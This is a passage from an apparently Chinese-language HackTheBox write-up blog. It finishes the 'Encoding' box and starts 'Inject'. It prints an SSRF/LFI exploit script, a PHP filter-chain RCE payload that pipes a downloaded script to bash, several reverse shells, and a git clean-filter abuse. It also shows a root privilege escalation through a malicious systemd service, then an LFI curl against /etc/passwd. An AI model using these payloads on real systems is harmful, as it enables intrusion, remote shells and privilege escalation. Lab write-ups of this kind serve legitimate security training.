&#123;</span><br><span class="line">    jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; file_get_contents(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, json_encode(<span class="variable">$post</span>));</span><br><span class="line">    curl_setopt( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>函数<code>get_url_content</code>禁止对127.0.0.1进行访问</p>
<p>页面调用功能时请求为<code>haxtables.htb/handler.php</code><br />
查看其代码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/html/handler.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../api/utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;uri_path&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo jsonify([&#x27;message&#x27; =&gt; file_get_contents(&#x27;php://input&#x27;)]);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = make_api_call(<span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>函数<code>make_api_call</code>无限制</p>
<p>但存在URL拼接</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>前面的内容用<code>@</code>注释<br />
后面的内容用<code>&amp;</code>注释</p>
<p>修改<code>exp.py</code>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri_path&#x27;</span> : <span class="string">&#x27;@image.haxtables.htb/actions/action_handler.php?page=%s&amp;&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://haxtables.htb/handler.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>再次尝试LFI</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py /etc/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure>
<p>使用<code>php_filter_chain_generator</code>生成PAYLOAD并进行RCE</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/synacktiv/php_filter_chain_generator</span><br><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php system(&quot;curl http://10.10.*.*/bfl.sh | bash&quot;);?&gt;     &#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.2/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/bfl.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp/ &amp;&amp; python -m http.server 80 &amp;</span><br><span class="line">python exp.py PAYLOAD</span><br></pre></td></tr></table></figure>
<p>获取反弹Shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on encoding:</span><br><span class="line">    (svc) NOPASSWD: &#x2F;var&#x2F;www&#x2F;image&#x2F;scripts&#x2F;git-commit.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$u</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m <span class="string">&quot;Commited from API!&quot;</span> --author=<span class="string">&quot;james &lt;james@haxtables.htb&gt;&quot;</span>  --no-verify</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;0.0.0.0&#x27;,9995));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span> &gt; /tmp/BFL</span><br><span class="line">chmod +x /tmp/BFL</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; /var/www/image/.git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/BFL</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Git提供了一种过滤机制，允许用户在文件检出或提交到Git存储库时将自定义脚本应用于文件。<br />
过滤机制由两种类型的过滤器组成：clean过滤器和smudge过滤器。clean过滤器用于在将文件提交到Git存储库之前转换文件的内容。smudge过滤器用于在从Git存储库检出文件时转换文件的内容。<br />
在这种情况下，攻击者创建了一个clean过滤器，该过滤器执行一个Python脚本，该脚本打开一个反向shell到指定的IP地址和端口。攻击者已将Git配置为对/var/www/image目录中的所有PHP文件使用此clean过滤器。这意味着每当该目录中的PHP文件提交到Git存储库时，将应用clean过滤器，并执行Python脚本。<br />
Generated By ChatGPT</p>
</blockquote>
<p>这个地方反弹Shell不能弹到本机<br />
疑似是网络问题，不能通过VPN的网络接口接收python reverse shell<br />
只能在靶机上再开个shell然后nc监听</p>
<p>查看<code>user.txt</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/svc/user.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">46b119076b33b6baadfb2467e0128703</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-26"><a class="markdownIt-Anchor" href="#权限提升-26"></a> 权限提升</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for svc on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on encoding:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;systemctl restart *</span><br></pre></td></tr></table></figure>
<p>查看路径权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getfacl /etc/systemd/system</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># file: etc&#x2F;systemd&#x2F;system</span><br><span class="line"># owner: root</span><br><span class="line"># group: root</span><br><span class="line">user::rwx</span><br><span class="line">user:svc:-wx</span><br><span class="line">group::rwx</span><br><span class="line">mask::rwx</span><br><span class="line">other::r-x</span><br></pre></td></tr></table></figure>
<p>编写service如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.*.*&#x2F;9996 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
<p>监听</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure>
<p>写入service</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n W1NlcnZpY2VdCkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi85OTk2IDA+JjEiCgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ= | base64 -d &gt; /etc/systemd/system/bufferfly.service</span><br></pre></td></tr></table></figure>
<p>重启service</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/systemctl restart bufferfly</span><br></pre></td></tr></table></figure>
<p>获取Shell，查看root.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffba7f2f7e12fd7fa94a522e00db275e</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_inject"><a class="markdownIt-Anchor" href="#hackthebox_inject"></a> HackTheBox_Inject</h1>
<h2 id="信息收集-11"><a class="markdownIt-Anchor" href="#信息收集-11"></a> 信息收集</h2>
<h3 id="端口扫描-28"><a class="markdownIt-Anchor" href="#端口扫描-28"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.204</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.204</span><br><span class="line">Host is up (2.3s latency).</span><br><span class="line">Not shown: 613 filtered ports, 385 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080&#x2F;tcp open  nagios-nsca Nagios NSCA</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-26"><a class="markdownIt-Anchor" href="#漏洞利用-26"></a> 漏洞利用</h2>
<p>请求<code>http://10.10.11.204:8080/upload</code></p>
<p>上传文件后通过以下方法下载文件</p>
<p><code>http://10.10.11.204:8080/show_image?img=FILENAME</code></p>
<p>LFI</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 